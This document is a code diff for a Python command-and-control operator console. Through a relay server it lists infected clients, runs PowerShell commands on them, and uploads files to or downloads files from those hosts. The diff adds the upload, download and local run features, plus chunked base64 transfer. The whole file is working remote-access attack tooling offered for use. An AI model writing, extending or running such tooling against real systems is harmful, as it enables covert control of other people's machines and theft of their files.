@@ -1,9 +1,14 @@
+import os
 import base64
 import logging
 import requests
 import argparse
+import subprocess
 
+CMD_ID = '@'
+UPLOAD_ID = '^'
 CHUNK_SIZE = 35000
+SIZE_LIMIT = 8500000
 LOG_FORMAT = '[%(asctime)s][%(levelname)s] %(message)s'
 BANNER = """
 *******************************************************************************
@@ -20,13 +25,13 @@ class Shell(object):
   BANNER = """
           ___
     . -^   `--,
-   /# =========`-_        +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
-  /# (--====___====\      |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
- /#   .- --.  . --.|      +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
-/##   |  * ) (   * ),                           Author: Aaron Reyes
+   /# =========`-_      +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
+  /# (--====___====\    |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
+ /#   .- --.  . --.|    +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
+/##   |  * ) (   * ),                         Author: Aaron Reyes
 |##   \    /\ \   / |
 |###   ---   \ ---  |
-|####      ___)    #|     Type 'help' for a list of commands
+|####      ___)    #|   Type 'help' for a list of commands
 |######           ##|
  \##### ---------- /
   \####           (
@@ -48,69 +53,84 @@ class Shell(object):
       logging.info('success. server is up!')
     print(self.BANNER)
 
-  def __run(self, ip, user, cmd):
+  def __e(self, d):
+    return base64.b64encode(d.encode('UTF-8')).decode('UTF-8')
+
+  def __u(self, ip):
+    if ip in [d['ip'] for d in self.hosts]:
+      return [d['user'] for d in self.hosts if d['ip'] == ip][0]
+    else:
+      return ''
+
+  def __r(self, ip, user, d, d_type):
+    if len(d) > SIZE_LIMIT:
+      logging.error('data size {0}B is beyond size limit of {1}B'.format(len(d), SIZE_LIMIT))
+      return ''
     s = ip + '|' + user
-    cmdx = base64.b64encode(cmd.encode('UTF-16LE')).decode('UTF-8')
-    # check if last command has been run
+    dx = base64.b64encode(d).decode('UTF-8')
+    # wait to send data
     while True:
-      r = requests.get(args.srv, params={'TxR': '{0}'.format(base64.b64encode(s.encode('UTF-8')).decode('UTF-8'))})
+      r = requests.get(self.srv, params={'TxR': '{0}'.format(self.__e(s))})
       if r.status_code != requests.codes.ok:
-        logging.error('request failed: {0}'.format(r.status_code))
+        logging.error('TxR GET request failed: {0}'.format(r.status_code))
         return ''
       logging.info('TxR: {0}'.format(r.content.decode('UTF-8')))
       if r.content.decode('UTF-8') == '0':
         break
     # send data
     col = 3
-    for i in range(0, len(cmdx), CHUNK_SIZE):
-      r = requests.post(args.srv, params={'Tx': '{0}'.format(base64.b64encode(''.join([s, '|', str(col)]).encode('UTF-8')).decode('UTF-8'))}, data={'d': cmdx[i:i+CHUNK_SIZE]})
+    for i in range(0, len(dx), CHUNK_SIZE):
+      r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|', str(col)])))}, data={'d': dx[i:i+CHUNK_SIZE]})
       if r.status_code != requests.codes.ok:
-        logging.error('request failed: {0}'.format(r.status_code))
+        logging.error('Tx POST request failed: {0}'.format(r.status_code))
         return ''
-      logging.info('TxD[{0}]: {1}'.format(col - 3, cmdx[i:i+CHUNK_SIZE]))
+      logging.info('TxD[{0}]: {1}'.format(col - 3, dx[i:i+CHUNK_SIZE]))
       col = col + 1
     # set data type
-    r = requests.post(args.srv, params={'Tx': '{0}'.format(base64.b64encode(''.join([s, '|2']).encode('UTF-8')).decode('UTF-8'))}, data={'d': '@'})
+    r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': d_type})
     if r.status_code != requests.codes.ok:
-      logging.error('request failed: {0}'.format(r.status_code))
+      logging.error('Tx POST request failed: {0}'.format(r.status_code))
       return ''
-    # loop for response
+    # wait to get data
     while True:
-      r = requests.get(args.srv, params={'RxR': '{0}'.format(base64.b64encode(s.encode('UTF-8')).decode('UTF-8'))})
+      r = requests.get(self.srv, params={'RxR': '{0}'.format(self.__e(s))})
       if r.status_code != requests.codes.ok:
-        logging.error('request failed: {0}'.format(r.status_code))
+        logging.error('RxR GET request failed: {0}'.format(r.status_code))
         return ''
       logging.info('RxR: {0}'.format(r.content.decode('UTF-8')))
       if r.content.decode('UTF-8') == '1':
         break
-    # download response
+    # download data
     col = 3
     buf = []
     while True:
-      r = requests.get(args.srv, params={'RxD': '{0}'.format(base64.b64encode(''.join([s, '|', str(col)]).encode('UTF-8')).decode('UTF-8'))})
+      r = requests.get(self.srv, params={'RxD': '{0}'.format(self.__e(''.join([s, '|', str(col)])))})
       if r.status_code != requests.codes.ok:
-        logging.error('request failed: {0}'.format(r.status_code))
+        logging.error('RxD GET request failed: {0}'.format(r.status_code))
         return ''
       if r.content.decode('UTF-8') == '':
         break
       logging.info('RxD[{0}]: {1}'.format(col - 3, r.content.decode('UTF-8')))
-      buf.append(base64.b64decode(r.content.decode('UTF-8')).decode('UTF-8'))
+      buf.append(r.content.decode('UTF-8'))
       col = col + 1
     # ACK download of data
-    r = requests.post(args.srv, params={'Rx': '{0}'.format(base64.b64encode(''.join([s, '|2']).encode('UTF-8')).decode('UTF-8'))}, data={'d': '0'})
+    r = requests.post(self.srv, params={'Rx': '{0}'.format(self.__e(''.join([s, '|2'])))}, data={'d': '0'})
     if r.status_code != requests.codes.ok:
-      logging.error('request failed: {0}'.format(r.status_code))
+      logging.error('Rx POST request failed: {0}'.format(r.status_code))
       return ''
-    # decode result
-    return ''.join(buf)
+    # return array of chunked data
+    return buf
 
   def help(self):
-    print('ls         - list all active clients')
-    print('shell <ip> - drop into a powershell session with <ip>')
-    print('quit       - exit')
+    print('ls                   - list all active clients')
+    print('run      <cmd>       - run command locally')
+    print('shell    <ip>        - run powershell commands on <ip>')
+    print('upload   <ip> <file> - upload local <file> to <ip>')
+    print('download <ip> <file> - download remote <file> from <ip>')
+    print('quit                 - exit')
 
   def ls(self):
-    r = requests.get(args.srv, params={'ls': ''})
+    r = requests.get(self.srv, params={'ls': ''})
     if r.status_code != requests.codes.ok:
       logging.error('failed to execute "ls" command. response: {0}'.format(r.status_code))
     else:
@@ -124,14 +144,19 @@ class Shell(object):
         logging.info('no hosts found')
       self.hosts = hosts
 
-  def run(self, ip):
+  def run(self, cmd):
+    try:
+      print(subprocess.check_output(cmd.split(' ')).decode('UTF-8'))
+    except:
+      logging.error('failed to run command: {0}'.format(cmd))
+
+  def shell(self, ip):
     logging.info('enter "quit" to exit shell')
     if not self.hosts:
       logging.error('no hosts loaded. try running "ls"')
       return
-    if ip in [d['ip'] for d in self.hosts]:
-      user = [d['user'] for d in self.hosts if d['ip'] == ip][0]
-    else:
+    user = self.__u(ip)
+    if not user:
       logging.error('invalid ip: {0}'.format(ip))
       return
     while True:
@@ -140,10 +165,39 @@ class Shell(object):
         logging.info('exiting shell on {0}'.format(ip))
         break
       if cmd.strip():
-        print(self.__run(ip, user, cmd))
+        d = self.__r(ip, user, cmd.encode('UTF-16LE'), CMD_ID)
+        print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
 
-  def upload(self):
-    pass
+  def upload(self, ip, path):
+    if not self.hosts:
+      logging.error('no hosts loaded. try running "ls"')
+      return
+    user = self.__u(ip)
+    if not user:
+      logging.error('invalid ip: {0}'.format(ip))
+      return
+    try:
+      with open(path, 'rb') as f:
+        d = self.__r(ip, user, f.read(), os.path.basename(path))
+        print(''.join([base64.b64decode(c).decode('UTF-8') for c in d]))
+    except:
+      logging.error('failed to send file: {0}'.format(path))
+
+  def download(self, ip, path):
+    if not self.hosts:
+      logging.error('no hosts loaded. try running "ls"')
+      return
+    user = self.__u(ip)
+    if not user:
+      logging.error('invalid ip: {0}'.format(ip))
+      return
+    try:
+      with open(path, 'wb') as f:
+        d = self.__r(ip, user, path.encode('UTF-8'), UPLOAD_ID)
+        f.write(b''.join([base64.b64decode(c) for c in d]))
+      print('SUCCESS')
+    except:
+      logging.error('failed to download file: {0}'.format(path))
 
 if __name__ == '__main__':
   # parse user arguments
@@ -157,14 +211,30 @@ if __name__ == '__main__':
   sh = Shell(args.srv)
   # accept user input for hosts
   while True:
-    cmd = input('> ').lower()
-    if cmd == 'help':
+    c = input('> ').lower()
+    if c == 'help':
       sh.help()
-    if cmd == 'ls':
+    if c == 'ls':
       sh.ls()
-    if cmd.startswith('shell'):
-      sh.run(cmd.replace('shell', '').strip())
-    if cmd.startswith('upload'):
-      sh.upload(cmd.replace('upload', '').strip())
-    if cmd in ['e', 'q', 'exit', 'quit']:
+    if c.startswith('run'):
+      sh.run(c.replace('run', '').strip())
+    if c.startswith('shell'):
+      sh_args = c.replace('shell', '').strip().split(' ')
+      if len(sh_args) != 1:
+        logging.error('invalid arguments. run "help"')
+        continue
+      sh.shell(sh_args[0])
+    if c.startswith('upload'):
+      sh_args = c.replace('upload', '').strip().split(' ')
+      if len(sh_args) != 2:
+        logging.error('invalid arguments. run "help"')
+        continue
+      sh.upload(sh_args[0], sh_args[1])
+    if c.startswith('download'):
+      sh_args = c.replace('download', '').strip().split(' ')
+      if len(sh_args) != 2:
+        logging.error('invalid arguments. run "help"')
+        continue
+      sh.download(sh_args[0], sh_args[1])
+    if c in ['e', 'q', 'exit', 'quit']:
       break
